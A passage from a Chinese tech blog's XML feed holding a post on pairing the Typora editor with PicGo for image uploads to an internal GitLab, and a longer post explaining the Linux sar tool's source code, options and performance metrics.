        <content type="html"><![CDATA[<h2 id="一、Typora"><a href="#一、Typora" class="headerlink" title="一、Typora"></a>一、Typora</h2><p><a href="https://typora.io/">Typora</a>是一款极简的Markdown写作编辑器，相比于传统的双栏目预览式编辑，Typora巧妙的实现了一种所见即所得的编辑模式，关于这款工具的详细的介绍，以及它与其他工具的对比，在网上到处都是，这里就不赘述了。我只简单的描述以下我对这个编辑的印象与评价。</p><ul><li>优点：<ul><li>风格极简，支持几种主流的主题风格，同时支持主题自定义；</li><li>所见即所得的创新的写作风格体验；</li><li>支持文档导出为多种格式，PDF，HTML，Word等；</li><li>支持LaTex公式；</li></ul></li><li>待改进：<ul><li>文档列表新建文件的按钮有时候会无响应，点击多次才能新建文件；</li><li>图片插入目前只支持iPic这款付费插件，诸如PicGo还不支持；</li></ul></li></ul><h2 id="二、PicGo"><a href="#二、PicGo" class="headerlink" title="二、PicGo"></a>二、PicGo</h2><p><a href="https://github.com/Molunerfinn/PicGo">PicGo</a>是一款开源的图床软件，该软件与iPic的不分伯仲，目前支持众多图床（SM.MS图床，腾讯云COS，微博图床，GitHub图床，七牛图床，Imgur图床，阿里云OSS，又拍云图床等），这里简单表述一下我的个人使用体验。</p><ul><li>优点：<ul><li>项目开源，文档支持中文，比较齐全；</li><li>支持插件，用户可根据自己需要自定义插件；</li></ul></li></ul><h2 id="三、结合使用"><a href="#三、结合使用" class="headerlink" title="三、结合使用"></a>三、结合使用</h2><p>由于公司内部使用GitLab，在记录一下issue的时候，相关图片又不便于存放在外网，在使用Typora的时候则需要图片信息能够自动保存在公司内部的GitLab中，因此不可避免的便需要Typora与PicGo的相互结合，目前Typora并没有支持PicGo的图片来源扩展，鉴于PicGo支持插件开发，所以充分利用的PicGo的插件来实现公司文档的便捷文档编写。</p><h3 id="3-1、PicGo的配置与插件"><a href="#3-1、PicGo的配置与插件" class="headerlink" title="3.1、PicGo的配置与插件"></a>3.1、PicGo的配置与插件</h3><ul><li><p>配置：</p><ul><li><code>链接格式</code>：在上传区的链接格式中将返回的数据格式选中为<code>Markdown</code>；</li><li><code>快捷键</code>：配置上传剪贴板图片的快捷键<code>Option + S</code>;</li></ul></li><li><p>插件：</p><ul><li><code>picgo-plugin-gitlab</code>：基于picgo-plugin-web-uploader开发，配置项目简单化，将图片上传到内部GitLab的指定的项目中，并返回图片的绝对URL；</li><li><code>picgo-plugin-autocopy</code>：自动复制上传完成后图片返回的URL地址；</li></ul></li></ul><h3 id="3-2、实际体验"><a href="#3-2、实际体验" class="headerlink" title="3.2、实际体验"></a>3.2、实际体验</h3><ul><li><p>截屏获取图片；</p></li><li><p>执行<code>Option + s</code>上传剪贴板的图片信息；</p></li><li><p>待图片上传完成后，在Typora编辑器中直接<code>Command + v</code>粘贴图片（实际写入的为Markdown格式）即可；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
            <tag> PicGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sar指令的使用与源码解析 - 每周指令</title>
      <link href="/2019/09/19/command-sar/"/>
      <url>/2019/09/19/command-sar/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>sar</code>是<code>System Activity Reporter</code>（系统活动情况报告）的缩写。<code>sar</code>工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据；取样数据分析的结果都可以存入文件， 所需的负载很小。<code>sar</code>是目前Linux上最为全面的系统性能分析工具之一，可以从14个大方面对系统的活动进行报告，包括文件的读写情况、系统调用的使用情况、串口、CPU效率、内存使用状况、进程活动及IPC有关的活动等，使用也是较为复杂。</p><p><code>sar</code>是查看操作系统报告指标的各种工具中，最为普遍和方便的；它有两种用法；</p><ul><li>追溯过去的统计数据（默认）</li><li>周期性的查看当前数据</li></ul><p><code>sar</code>只是<a href="https://github.com/sysstat/sysstat">sysstat</a>（最新版本为<a href="https://github.com/sysstat/sysstat/tree/v12.1.6">v12.1.6</a>）软件包中的一个工具，<code>sar</code>相关的工具还包括<code>sadc</code>、<code>sa1</code>、<code>sa2</code>：</p><ul><li><code>sadc</code>：系统动态数据收集工具，收集的数据被写入一个二进制文件中，它是<code>sar</code>工具后端；</li><li><code>sa1</code>：将每日的系统活动信息以二进制数据的形式写入到文件中，由<code>cron</code>调用，默认的<code>cron</code>作业位于<code>/etc/cron.d/sysstat</code>；</li><li><code>sa2</code>：在 <code>/var/log/sa</code> 目录中每日写入一个报告，由<code>cron</code>调用，默认的<code>cron</code>作业位于<code>/etc/cron.d/sysstat</code>；</li><li><code>sar</code>：负责解析<code>sadc</code>保存的数据，并显示出来；</li></ul><h2 id="二、源码分析"><a href="#二、源码分析" class="headerlink" title="二、源码分析"></a>二、源码分析</h2><h3 id="2-1、sadc：系统动态数据采集工具"><a href="#2-1、sadc：系统动态数据采集工具" class="headerlink" title="2.1、sadc：系统动态数据采集工具"></a>2.1、sadc：系统动态数据采集工具</h3><ul><li><p>文件：<code>sadc.c</code>（<code>rw_sa_stat_loop()</code>函数和<code>read_stats()</code>函数） 和 <code>activity.c</code>（<code>act[]</code>结构体）；</p></li><li><p>功能：解析参数、启动一个interval alarm、rw_sa_stat_loop()读取数据；</p></li><li><p>核心函数&#x2F;代码：</p><ul><li><code>rw_sa_stat_loop()</code>：整个<code>sadc</code>的核心循环，这里从个<code>sysfs</code>读取信息，并提取关键信息，然后保存；</li><li><code>read_stats()</code>：核心采集数据函数，核心数据结构式<code>act[]</code>；</li><li><code>act[]</code>：存放了所有统计事件的<code>struct activity</code>；</li></ul></li><li><p>代码解析：</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sadc.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> ***************************************************************************</span></span><br><span class="line"><span class="comment"> * 主循环：从相关来源读取统计数据并显示它们。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * IN：</span></span><br><span class="line"><span class="comment"> * @count要显示的统计数据行数。</span></span><br><span class="line"><span class="comment"> * @rectime当前日期和时间。</span></span><br><span class="line"><span class="comment"> * @stdfdStdout文件描述符。</span></span><br><span class="line"><span class="comment"> * @ofd输出文件描述符。</span></span><br><span class="line"><span class="comment"> * @ofile输出文件的名称。 </span></span><br><span class="line"><span class="comment"> ***************************************************************************</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rw_sa_stat_loop</span><span class="params">(<span class="type">long</span> count, <span class="keyword">struct</span> tm *rectime, <span class="type">int</span> stdfd, <span class="type">int</span> ofd,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> ofile[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为SIGINT设置处理程序 */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;int_act, <span class="number">0</span>, <span class="keyword">sizeof</span>(int_act));</span><br><span class="line">int_act.sa_handler = (<span class="type">void</span> *) int_handler;</span><br><span class="line">sigaction(SIGINT, &amp;int_act, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主循环 */</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取然后写入统计数据 */</span></span><br><span class="line">read_stats();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果记录类型为R_LAST_STATS，则在写入之前将其标记为R_STATS */</span></span><br><span class="line">record_hdr.record_type = R_STATS;</span><br><span class="line"><span class="keyword">if</span> (ofile[<span class="number">0</span>]) &#123;</span><br><span class="line">      <span class="comment">// 将结果写到指定文件中</span></span><br><span class="line">write_stats(ofd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line">      <span class="comment">// 此处和alarm()配合达到周期性采样的效果</span></span><br><span class="line">pause();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 必要时旋转活动文件 */</span></span><br><span class="line"><span class="keyword">if</span> (WANT_SA_ROTAT(flags)) &#123;</span><br><span class="line"><span class="comment">/* 用户指定&#x27; -&#x27;作为要使用的文件名 */</span></span><br><span class="line">set_default_file(rectime, new_ofile, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(ofile, new_ofile)) &#123;</span><br><span class="line">do_sa_rotat = TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// 达到总采样数，同样停止采样</span></span><br><span class="line"><span class="keyword">while</span> (count);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 关闭文件描述符，如果它们实际已被使用 */</span></span><br><span class="line">CLOSE(stdfd);</span><br><span class="line">CLOSE(ofd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// activity.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">activity</span> *<span class="title">act</span>[<span class="title">NR_ACT</span>] =</span> &#123;</span><br><span class="line">    &amp;cpu_act,</span><br><span class="line">    &amp;pcsw_act,</span><br><span class="line">    &amp;irq_act,</span><br><span class="line">    &amp;swap_act,</span><br><span class="line">    &amp;paging_act,</span><br><span class="line">    &amp;io_act,</span><br><span class="line">    &amp;memory_act,</span><br><span class="line">    &amp;huge_act,</span><br><span class="line">    &amp;ktables_act,</span><br><span class="line">    &amp;queue_act,</span><br><span class="line">    &amp;serial_act,</span><br><span class="line">    &amp;disk_act,</span><br><span class="line">    <span class="comment">/* &lt;network&gt; */</span></span><br><span class="line">    &amp;net_dev_act,</span><br><span class="line">    &amp;net_edev_act,</span><br><span class="line">    &amp;net_nfs_act,</span><br><span class="line">    &amp;net_nfsd_act,</span><br><span class="line">    &amp;net_sock_act,</span><br><span class="line">    &amp;net_ip_act,</span><br><span class="line">    &amp;net_eip_act,</span><br><span class="line">    &amp;net_icmp_act,</span><br><span class="line">    &amp;net_eicmp_act,</span><br><span class="line">    &amp;net_tcp_act,</span><br><span class="line">    &amp;net_etcp_act,</span><br><span class="line">    &amp;net_udp_act,</span><br><span class="line">    &amp;net_sock6_act,</span><br><span class="line">    &amp;net_ip6_act,</span><br><span class="line">    &amp;net_eip6_act,</span><br><span class="line">    &amp;net_icmp6_act,</span><br><span class="line">    &amp;net_eicmp6_act,</span><br><span class="line">    &amp;net_udp6_act,</span><br><span class="line">    &amp;fchost_act,</span><br><span class="line">    &amp;softnet_act,    <span class="comment">/* AO_CLOSE_MARKUP */</span></span><br><span class="line">    <span class="comment">/* &lt;/network&gt; */</span></span><br><span class="line">    <span class="comment">/* &lt;power-management&gt; */</span></span><br><span class="line">    &amp;pwr_cpufreq_act,</span><br><span class="line">    &amp;pwr_fan_act,</span><br><span class="line">    &amp;pwr_temp_act,</span><br><span class="line">    &amp;pwr_in_act,</span><br><span class="line">    &amp;pwr_wghfreq_act,</span><br><span class="line">    &amp;pwr_usb_act,        <span class="comment">/* AO_CLOSE_MARKUP */</span></span><br><span class="line">    <span class="comment">/* &lt;/power-management&gt; */</span></span><br><span class="line">    &amp;filesystem_act</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-2、sar显示统计信息"><a href="#2-2、sar显示统计信息" class="headerlink" title="2.2、sar显示统计信息"></a>2.2、sar显示统计信息</h3><ul><li>文件：<code>sar.c</code></li><li>核心函数&#x2F;代码：<ul><li><code>read_sadc_stat_bunch()</code>：读取<code>act</code>结构体中统计信息；</li><li><code>write_stats()</code>：调用每个<code>struct activity</code>的<code>f_print()</code>函数；</li><li><code>write_stats_avg()</code>：调用每个<code>struct activity</code>的<code>f_print_avg()</code>函数；</li></ul></li><li>代码解析：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sa.h</span></span><br><span class="line"><span class="type">__print_funct_t</span> (*f_print) (<span class="keyword">struct</span> activity *, <span class="type">int</span>, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">__print_funct_t</span> (*f_print_avg) (<span class="keyword">struct</span> activity *, <span class="type">int</span>, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sar.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_sadc_stat_bunch</span><span class="params">(<span class="type">int</span> curr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_ACT; i++) &#123;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"><span class="keyword">if</span> (sa_read(act[p]-&gt;buf[curr], act[p]-&gt;fsize * act[p]-&gt;nr * act[p]-&gt;nr2)) &#123;</span><br><span class="line">print_read_error();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sar.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_stats</span><span class="params">(<span class="type">int</span> curr, <span class="type">int</span> read_from_file, <span class="type">long</span> *cnt, <span class="type">int</span> use_tm_start,</span></span><br><span class="line"><span class="params"><span class="type">int</span> use_tm_end, <span class="type">int</span> reset, <span class="type">unsigned</span> <span class="type">int</span> act_id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_ACT; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((act_id != ALL_ACTIVITIES) &amp;&amp; (act[i]-&gt;id != act_id))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_SELECTED(act[i]-&gt;options) &amp;&amp; (act[i]-&gt;nr &gt; <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">/* 显示当前活动统计信息 */</span></span><br><span class="line">(*act[i]-&gt;f_print)(act[i], !curr, curr,</span><br><span class="line">   NEED_GLOBAL_ITV(act[i]-&gt;options) ? g_itv : itv);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sar.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_stats_avg</span><span class="params">(<span class="type">int</span> curr, <span class="type">int</span> read_from_file, <span class="type">unsigned</span> <span class="type">int</span> act_id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_ACT; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((act_id != ALL_ACTIVITIES) &amp;&amp; (act[i]-&gt;id != act_id))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_SELECTED(act[i]-&gt;options) &amp;&amp; (act[i]-&gt;nr &gt; <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">/* 显示当前平均活动统计信息 */</span></span><br><span class="line">(*act[i]-&gt;f_print_avg)(act[i], <span class="number">2</span>, curr,</span><br><span class="line">       NEED_GLOBAL_ITV(act[i]-&gt;options) ? g_itv : itv);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 此处省略部分代码 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、参数解析"><a href="#三、参数解析" class="headerlink" title="三、参数解析"></a>三、参数解析</h2><h3 id="3-1、参数列表（演示版本为10-1-5）："><a href="#3-1、参数列表（演示版本为10-1-5）：" class="headerlink" title="3.1、参数列表（演示版本为10.1.5）："></a>3.1、参数列表（演示版本为<code>10.1.5</code>）：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz]<span class="comment"># sar -V</span></span><br><span class="line">sysstat version 10.1.5</span><br><span class="line">(C) Sebastien Godard (sysstat &lt;at&gt; orange.fr)</span><br><span class="line"></span><br><span class="line">[root@bugwz]<span class="comment"># sar --help</span></span><br><span class="line">Usage: sar [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]</span><br><span class="line">Options are:</span><br><span class="line">[ -A ] [ -B ] [ -b ] [ -C ] [ -d ] [ -H ] [ -h ] [ -p ] [ -q ] [ -R ]</span><br><span class="line">[ -r ] [ -S ] [ -t ] [ -u [ ALL ] ] [ -V ] [ -v ] [ -W ] [ -w ] [ -y ]</span><br><span class="line">[ -I &#123; &lt;int&gt; [,...] | SUM | ALL | XALL &#125; ] [ -P &#123; &lt;cpu&gt; [,...] | ALL &#125; ]</span><br><span class="line">[ -m &#123; &lt;keyword&gt; [,...] | ALL &#125; ] [ -n &#123; &lt;keyword&gt; [,...] | ALL &#125; ]</span><br><span class="line">[ -j &#123; ID | LABEL | PATH | UUID | ... &#125; ]</span><br><span class="line">[ -f [ &lt;filename&gt; ] | -o [ &lt;filename&gt; ] | -[0-9]+ ]</span><br><span class="line">[ -i &lt;interval&gt; ] [ -s [ &lt;hh:mm:ss&gt; ] ] [ -e [ &lt;hh:mm:ss&gt; ] ]</span><br></pre></td></tr></table></figure><h3 id="3-2、参数含义解析："><a href="#3-2、参数含义解析：" class="headerlink" title="3.2、参数含义解析："></a>3.2、参数含义解析：</h3><ul><li><code>sar -c 1 10</code>：执行<code>sar -c</code>指令共<code>10次</code>，每隔<code>1秒</code>执行<code>1次</code>；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-A ：汇总所有的报告</span><br><span class="line">-B ：分页状况</span><br><span class="line">-b ：I/O 和传输速率信息状况</span><br><span class="line">-C ：</span><br><span class="line">-d ：块设备状况</span><br><span class="line">-H ：</span><br><span class="line">-h ：报告关于buffer使用的统计数据</span><br><span class="line">-p ：调页活动的使用情况</span><br><span class="line">-q ：队列长度和平均负载</span><br><span class="line">-R ：内存状况</span><br><span class="line">-r ：内存利用率</span><br><span class="line">-S ：交换空间利用率</span><br><span class="line">-t ：</span><br><span class="line">-u ：CPU的利用率</span><br><span class="line">-V ：版本信息</span><br><span class="line">-v ：Kernel table 状况</span><br><span class="line">-W ：交换信息</span><br><span class="line">-w ：任务创建与系统转换统计信息</span><br><span class="line">-y ：TTY 设备状况</span><br><span class="line">-I ：中断信息状况</span><br><span class="line">-P ：</span><br><span class="line">-m ：电源管理信息状况</span><br><span class="line">-n ：网络统计信息，格式为：&#123; &lt;keyword&gt; [,...] | ALL &#125;，keyword可以是：</span><br><span class="line">     DEV          网卡</span><br><span class="line">     EDEV         网卡(错误信息)</span><br><span class="line">     NFS          NFS客户端</span><br><span class="line">     NFSD         NFS服务器</span><br><span class="line">     SOCK         Sockets     (v4)</span><br><span class="line">     IP           IP流        (v4)</span><br><span class="line">     EIP          IP流        (v4)(错误信息)</span><br><span class="line">     ICMP         ICMP流      (v4)</span><br><span class="line">     EICMP        ICMP流      (v4)(错误信息)</span><br><span class="line">     TCP          TCP流       (v4)</span><br><span class="line">     ETCP         TCP流       (v4)(错误信息)</span><br><span class="line">     UDP          UDP流       (v4)</span><br><span class="line">     SOCK6        Sockets     (v6)</span><br><span class="line">     IP6          IP流        (v6)</span><br><span class="line">     EIP6         IP流        (v6)(错误信息)</span><br><span class="line">     ICMP6        ICMP流      (v6)</span><br><span class="line">     EICMP6       ICMP流      (v6)(错误信息)</span><br><span class="line">     UDP6         UDP流       (v6)</span><br><span class="line">-j ：</span><br><span class="line">-f ：</span><br><span class="line">-o ：</span><br><span class="line">-i ：</span><br><span class="line">-s ：</span><br><span class="line">-e ：</span><br></pre></td></tr></table></figure><h2 id="四、详细数据指标解析"><a href="#四、详细数据指标解析" class="headerlink" title="四、详细数据指标解析"></a>四、详细数据指标解析</h2><h3 id="4-1、查看CPU的利用率"><a href="#4-1、查看CPU的利用率" class="headerlink" title="4.1、查看CPU的利用率"></a>4.1、查看CPU的利用率</h3><p>指令：<code>sar -u</code>，该参数与<code>sar -C</code>，<code>sar -p</code>，<code>sar</code> 的输出信息一致。</p><p><img src="https://cdn.bugwz.com/sar-u.png" alt="sar -u"></p><p><strong>数据指标解析：</strong></p><ul><li><code>%user</code>：用户模式下消耗的CPU时间的比例；</li><li><code>%nice</code>：通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例；</li><li><code>%system</code>：系统模式下消耗的CPU时间的比例；</li><li><code>%iowait</code>：CPU等待磁盘I&#x2F;O导致空闲状态消耗的时间比例；</li><li><code>%steal</code>：利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例；</li><li><code>%idle</code>：CPU空闲时间比例；</li></ul><h3 id="4-2、队列长度和平均负载（队列信息）"><a href="#4-2、队列长度和平均负载（队列信息）" class="headerlink" title="4.2、队列长度和平均负载（队列信息）"></a>4.2、队列长度和平均负载（队列信息）</h3><p>指令：<code>sar -q</code>，查看运行队列中的进程数、系统上的进程大小、平均负载等，与其它命令相比，它能查看各项指标随时间变化的情况；</p><p><img src="https://cdn.bugwz.com/sar-q.png" alt="sar -q"></p><p><strong>数据指标解析：</strong></p><ul><li><code>runq-sz</code>：运行队列的长度（等待运行的进程数）；</li><li><code>plist-sz</code>：进程列表中进程（processes）和线程（threads）的数量；</li><li><code>ldavg-1</code>：最后1分钟的系统平均负载；</li><li><code>ldavg-5</code>：过去5分钟的系统平均负载；</li><li><code>ldavg-15</code>：过去15分钟的系统平均负载；</li><li><code>blocked</code>：</li></ul><h3 id="4-3、内存利用率"><a href="#4-3、内存利用率" class="headerlink" title="4.3、内存利用率"></a>4.3、内存利用率</h3><p>指令：<code>sar -r</code></p><p><img src="https://cdn.bugwz.com/sar-r.png" alt="sar -r"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbmemfree</code>：这个值和free命令中的free值基本一致，不包括buffer和cache的空间；</li><li><code>kbmemused</code>：这个值和free命令中的used值基本一致，包括buffer和cache的空间；</li><li><code>%memused</code>：物理内存使用率，这个值是kbmemused和内存总量(不包括swap)的一个百分比；</li><li><code>kbbuffers</code>：对应free命令中的buffer；</li><li><code>kbcached</code>：对应free命令中的cache；</li><li><code>kbcommit</code>：保证当前系统所需要的内存,即为了确保不溢出而需要的内存(RAM+swap)；</li><li><code>%commit</code>：这个值是kbcommit与内存总量(包括swap)的一个百分比；</li><li><code>kbactive</code>：</li><li><code>kbinact</code>：</li><li><code>kbdirty</code>：</li></ul><h3 id="4-4、页面交换情况"><a href="#4-4、页面交换情况" class="headerlink" title="4.4、页面交换情况"></a>4.4、页面交换情况</h3><p>指令：<code>sar -W</code>，页面发生交换时，服务器的吞吐量会大幅下降；服务器状况不良时，如果怀疑因为内存不足而导致了页面交换的发生，可以使用这个命令来确认是否发生了大量的交换；</p><p><img src="https://cdn.bugwz.com/sar-W.png" alt="sar -W"></p><p><strong>数据指标解析：</strong></p><ul><li>pswpin&#x2F;s：每秒系统换入的交换页面（swap page）数量；</li><li>pswpout&#x2F;s：每秒系统换出的交换页面（swap page）数量；</li></ul><h3 id="4-5、分页情况"><a href="#4-5、分页情况" class="headerlink" title="4.5、分页情况"></a>4.5、分页情况</h3><p>指令：<code>sar -B</code></p><p><img src="https://cdn.bugwz.com/sar-B.png" alt="sar -B"></p><p><strong>数据指标解析：</strong></p><ul><li>pgpgin&#x2F;s：</li><li>pgpgout&#x2F;s：</li><li>fault&#x2F;s：</li><li>majflt&#x2F;s：</li><li>pgfree&#x2F;s：</li><li>pgscank&#x2F;s：</li><li>pgscand&#x2F;s：</li><li>pgsteal&#x2F;s：</li><li>%vmeff：</li></ul><h3 id="4-6、I-x2F-O-和传输速率信息情况"><a href="#4-6、I-x2F-O-和传输速率信息情况" class="headerlink" title="4.6、I&#x2F;O 和传输速率信息情况"></a>4.6、I&#x2F;O 和传输速率信息情况</h3><p>指令：<code>sar -b</code></p><p><img src="https://cdn.bugwz.com/sar-b-little.png" alt="sar -b"></p><p><strong>数据指标解析：</strong></p><ul><li><code>tps</code>：每秒钟物理设备的 I&#x2F;O 传输总量；</li><li><code>rtps</code>：每秒钟从物理设备读入的数据总量；</li><li><code>wtps</code>：每秒钟向物理设备写入的数据总量；</li><li><code>bread/s</code>：每秒钟从物理设备读入的数据量，单位为 块&#x2F;s；</li><li><code>bwrtn/s</code>：每秒钟向物理设备写入的数据量，单位为 块&#x2F;s；</li></ul><h3 id="4-7、块设备信息"><a href="#4-7、块设备信息" class="headerlink" title="4.7、块设备信息"></a>4.7、块设备信息</h3><p>指令：<code>sar -d</code></p><p><img src="https://cdn.bugwz.com/sar-d.png" alt="sar -d"></p><p><strong>数据指标解析：</strong></p><ul><li><code>DEV</code>：正在监视的块设备；</li><li><code>tps</code>：每秒钟物理设备的 I&#x2F;O 传输总量；</li><li><code>rd_sec/s</code>：每秒从设备读取的扇区（sector）数量；</li><li><code>wr_sec/s</code>：每秒向设备写入的扇区（sector）数量；</li><li><code>avgrq-sz</code>：发给设备请求的平均扇区数；</li><li><code>avgqu-sz</code>：发给设备请求的平均队列长度；</li><li><code>await</code>：设备 I&#x2F;O 请求的平均等待时间（单位为毫秒）；</li><li><code>svctm</code>：设备 I&#x2F;O 请求的平均服务时间（单位为毫秒）；</li><li><code>%util</code>：在 I&#x2F;O 请求发送到设备期间，占用 CPU 时间的百分比，用于体现设备的带宽利用率；</li></ul><h3 id="4-8、大页信息"><a href="#4-8、大页信息" class="headerlink" title="4.8、大页信息"></a>4.8、大页信息</h3><p>指令：<code>sar -H</code></p><p><img src="https://cdn.bugwz.com/sar-H.png" alt="sar -H"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbhugfree</code>：</li><li><code>kbhugused</code>：</li><li><code>%hugused</code>：</li></ul><h3 id="4-9、内存状况"><a href="#4-9、内存状况" class="headerlink" title="4.9、内存状况"></a>4.9、内存状况</h3><p>指令：<code>sar -R</code></p><p><img src="https://cdn.bugwz.com/sar-R-big.png" alt="sar -R"></p><p><strong>数据指标解析：</strong></p><ul><li><code>frmpg/s</code>：每秒系统中空闲的内存页面（memory page freed）数量；</li><li><code>bufpg/s</code>：每秒系统中用作缓冲区（buffer）的附加内存页面（additional memory page）数量；</li><li><code>campg/s</code>：每秒系统中高速缓存的附加内存页面（additional memory pages cached）数量；</li></ul><h3 id="4-10、交换空间利用信息"><a href="#4-10、交换空间利用信息" class="headerlink" title="4.10、交换空间利用信息"></a>4.10、交换空间利用信息</h3><p>指令：<code>sar -S</code></p><p><img src="https://cdn.bugwz.com/sar-S.png" alt="sar -S"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbswpfree</code>：可用的空闲交换空间数量，单位为 KB；</li><li><code>kbswpused</code>：已使用的交换空间数量，单位为 KB；</li><li><code>kbswpcad</code>：交换空间的高速缓存使用的内存数量；</li><li><code>%swpcad</code>：</li></ul><h3 id="4-11、动态CPU信息"><a href="#4-11、动态CPU信息" class="headerlink" title="4.11、动态CPU信息"></a>4.11、动态CPU信息</h3><p>指令：<code>sar -t interval</code>，按照给定的<code>interval</code>的值，循环打印CPU的信息。</p><p><img src="https://cdn.bugwz.com/sar-t-interval.png" alt="sar -t interval"></p><p><strong>数据指标解析：</strong></p><ul><li><code>CPU</code>：all 表示统计信息为所有 CPU 的平均值；</li><li><code>%user</code>：显示在用户级别(application)运行使用 CPU 总时间的百分比；</li><li><code>%nice</code>：显示在用户级别，用于nice操作，所占用 CPU 总时间的百分比；</li><li><code>%system</code>：在核心级别(kernel)运行所使用 CPU 总时间的百分比；</li><li><code>%iowait</code>：显示用于等待I&#x2F;O操作占用 CPU 总时间的百分比；</li><li><code>%steal</code>：管理程序(hypervisor)为另一个虚拟进程提供服务而等待虚拟 CPU 的百分比；</li><li><code>%idle</code>：显示 CPU 空闲时间占用 CPU 总时间的百分比；</li></ul><h3 id="4-12、Kernel-Table-信息"><a href="#4-12、Kernel-Table-信息" class="headerlink" title="4.12、Kernel Table 信息"></a>4.12、Kernel Table 信息</h3><p>指令：<code>sar -v</code></p><p><img src="https://cdn.bugwz.com/sar-v.png" alt="sar -v"></p><p><strong>数据指标解析：</strong></p><ul><li><code>dentunusd</code>：目录高速缓存中未被使用的条目数量；</li><li><code>file-nr</code>：</li><li><code>inode-nr</code>：</li><li><code>pty-nr</code>：</li></ul><h3 id="4-13、任务创建与系统转换统计信息"><a href="#4-13、任务创建与系统转换统计信息" class="headerlink" title="4.13、任务创建与系统转换统计信息"></a>4.13、任务创建与系统转换统计信息</h3><p>指令：<code>sar -w</code></p><p><img src="https://cdn.bugwz.com/sar-w-little.png" alt="sar-w"></p><p><strong>数据指标解析：</strong></p><ul><li><code>proc/s</code>：每秒钟创建的进程数；</li><li><code>cswch/s</code>：</li></ul><h3 id="4-14、TTY-设备信息"><a href="#4-14、TTY-设备信息" class="headerlink" title="4.14、TTY 设备信息"></a>4.14、TTY 设备信息</h3><p>指令：<code>sar -y</code></p><p><img 